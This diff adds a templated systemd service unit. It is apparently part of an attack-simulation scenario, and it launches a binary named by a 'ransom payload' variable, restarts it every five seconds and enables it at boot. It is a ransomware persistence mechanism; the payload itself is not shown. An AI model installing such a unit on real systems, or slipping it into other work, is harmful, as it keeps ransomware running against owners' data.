@@ -1,0 +1,12 @@
+[Unit]
+Description={{ attack_supplypro_ransom_payload_name }} starter
+
+
+[Service]
+Restart=always
+RestartSec=5
+ExecStart=/usr/bin/{{ attack_supplypro_ransom_payload_name }}
+User=%I
+
+[Install]
+WantedBy=multi-user.target
